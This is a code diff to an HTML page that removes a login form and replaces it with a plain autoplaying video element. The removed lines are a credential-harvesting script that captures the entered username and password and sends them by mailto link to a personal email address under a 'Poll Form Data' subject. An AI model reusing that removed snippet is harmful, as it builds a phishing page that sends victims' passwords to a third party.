@@ -1,18 +1,4 @@
-<form>
-  <label for="username">Username:</label>
-  <input type="text" id="username" name="username">
-  <br>
-  <label for="password">Password:</label>
-  <input type="password" id="password" name="password">
-  <br><br>
-  <input type="submit" value="Login">
-</form>
-<script>
-  function sendFormData() {
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-    const formData = "Username: " + username + " Password: " + password;
-    window.location.href = "mailto:stefandatema1996@gmail.com?subject=Poll Form Data&body=" + formData;
-  }
-  document.querySelector("form").addEventListener("submit", sendFormData);
-</script>
+<video width="320" height="240" controls autoplay loop>
+  <source src="path/to/video.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
